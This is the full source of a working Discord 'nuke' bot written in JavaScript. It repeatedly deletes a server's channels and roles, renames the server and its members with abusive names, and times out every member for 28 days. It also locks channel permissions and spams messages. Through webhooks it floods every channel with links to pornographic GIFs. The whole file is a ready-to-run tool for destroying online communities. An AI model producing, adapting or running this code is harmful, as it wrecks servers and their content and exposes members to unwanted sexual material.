require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const CHAOS_INTERVAL = Number(process.env.CHAOS_INTERVAL) || 10 * 1000; // faster
const MAX_ACTIONS_PER_TICK = Number(process.env.MAX_ACTIONS_PER_TICK) || 30;
const PROTECTED_CHANNEL = 'aaaaaaaa';

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = [
  "https://klipy.com/gifs/orgasm-cumming-1"
];

const GIF_TYPE_2 = [
  "https://klipy.com/gifs/vegan-porn-carrot-porn"
];

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'HALLUCINATION', 'SERVER DEAD', 'OWNED', 'RIP',
  'GET FUCKED', 'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE',
  'MINIONS ACTIVE', 'REALITY BROKEN', 'CHAOS OVERLOAD'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead',
  'chaos', 'void', 'pain', 'end', 'lmao', 'gg', 'bot-was-here',
  'no-escape', 'server-corpse', 'extreme-nuke', 'minion-zone',
  'hallucination', 'glitch', 'error', 'deleted', 'why'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY',
  'NO HOPE', 'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion', 'Glitch'
];

const MESSAGES = [
  '**HALLUCINATION NUKE**', 'SERVER IS DEAD', 'GET FUCKED',
  'NO SURVIVORS', 'OWNED', 'THE END', 'RIP SERVER',
  'YOU CANNOT STOP THIS', 'BOT WINS', 'GOODBYE',
  'MINIONS ARE HELPING', 'REALITY IS BREAKING', 'TOO FAST'
];

const MINION_NAMES = ['Minion', 'Minion-2', 'Chaos Helper', 'Glitch', 'Slave'];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

async function getOrCreateWebhook(channel, name = 'Minion') {
  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({
        name: name,
        reason: 'Chaos Minion',
      });
    }
    return webhook;
  } catch (err) {
    return null;
  }
}

// ================== ACTIONS ==================
const extremeActions = [
  // Rename server
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
  },

  // Aggressive channel delete
  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    for (const channel of channels) {
      if (channel.name === PROTECTED_CHANNEL) continue;
      await channel.delete('HALLUCINATION').catch(() => {});
    }
  },

  // Fast create spam channels
  async (guild) => {
    for (let i = 0; i < 8; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        });
        await ch.send(randomItem(MESSAGES)).catch(() => {});
      } catch (e) {}
    }
  },

  // Create + instantly delete (hallucination effect)
  async (guild) => {
    for (let i = 0; i < 4; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['temp', 'glitch', 'deleted', 'error', 'flash']),
          type: ChannelType.GuildText,
        });
        await ch.send('👁').catch(() => {});
        setTimeout(() => ch.delete().catch(() => {}), 3000 + Math.random() * 4000);
      } catch (e) {}
    }
  },

  // Delete roles
  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    for (const role of roles) {
      if (role.id === guild.id) continue;
      if (!role.editable) continue;
      await role.delete('HALLUCINATION').catch(() => {});
    }
  },

  // Create roles fast
  async (guild) => {
    for (let i = 0; i < 6; i++) {
      await guild.roles.create({
        name: randomItem(ROLE_NAMES),
        color: Colors.Red,
        reason: 'HALLUCINATION',
      }).catch(() => {});
    }
  },

  // Mass nickname
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
    }
  },

  // Mass timeout
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.moderatable) continue;
      await member.timeout(28 * 24 * 60 * 60 * 1000, 'HALLUCINATION').catch(() => {});
    }
  },

  // Message spam
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    for (const channel of channels.values()) {
      for (let i = 0; i < 4; i++) {
        await channel.send(randomItem(MESSAGES)).catch(() => {});
      }
    }
  },

  // Lock permissions
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    for (const channel of channels.values()) {
      await channel.permissionOverwrites.edit(guild.roles.everyone, {
        ViewChannel: false,
        SendMessages: false,
        Connect: false,
        Speak: false,
      }).catch(() => {});
    }
  },

  // Bot nickname
  async (guild) => {
    await guild.members.me.setNickname(randomItem(['HALLUCINATION', 'EXTREME NUKE', 'MINION BOSS', 'REALITY BREAKER'])).catch(() => {});
  },

  // ================== HEAVY MINION SYSTEM ==================
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    for (const channel of channels.values()) {
      // Create multiple minions per channel
      for (const minionName of MINION_NAMES) {
        const webhook = await getOrCreateWebhook(channel, minionName);
        if (!webhook) continue;

        // Each minion spams hard
        for (let i = 0; i < 4; i++) {
          const useType1 = Math.random() < 0.5;
          const gif = useType1 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);

          if (gif) {
            await webhook.send({
              content: gif,
              username: minionName,
            }).catch(() => {});
          } else {
            await webhook.send({
              content: randomItem(MESSAGES),
              username: minionName,
            }).catch(() => {});
          }
        }
      }
    }
    console.log('👾 Minions went crazy');
  },

  // Extra: Create categories then delete them later
  async (guild) => {
    for (let i = 0; i < 3; i++) {
      try {
        const cat = await guild.channels.create({
          name: randomItem(['HALLUCINATION', 'VOID', 'ERROR', 'MINIONS', 'GLITCH']),
          type: ChannelType.GuildCategory,
        });
        setTimeout(() => cat.delete().catch(() => {}), 8000 + Math.random() * 10000);
      } catch (e) {}
    }
  },
];

// ================== MAIN ==================
async function doExtremeNuke(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
    console.log('⚠️ Missing Administrator permission');
    return;
  }

  console.log(`\n======== HALLUCINATION NUKE + MINIONS on ${guild.name} ========`);

  const selected = [...extremeActions]
    .sort(() => 0.5 - Math.random())
    .slice(0, MAX_ACTIONS_PER_TICK);

  for (const action of selected) {
    try {
      await action(guild);
      await new Promise(r => setTimeout(r, 150)); // faster
    } catch (err) {
      console.error('❌', err.message);
    }
  }
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 HALLUCINATION MODE ACTIVE | Every ${CHAOS_INTERVAL / 1000}s`);

  setInterval(async () => {
    const guild = TARGET_GUILD_ID
      ? client.guilds.cache.get(TARGET_GUILD_ID)
      : client.guilds.cache.first();
    if (guild) await doExtremeNuke(guild);
  }, CHAOS_INTERVAL);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await message.reply('💣 **HALLUCINATION NUKE + MINIONS LAUNCHED**');
    await doExtremeNuke(message.guild);
  }
});

client.login(TOKEN);
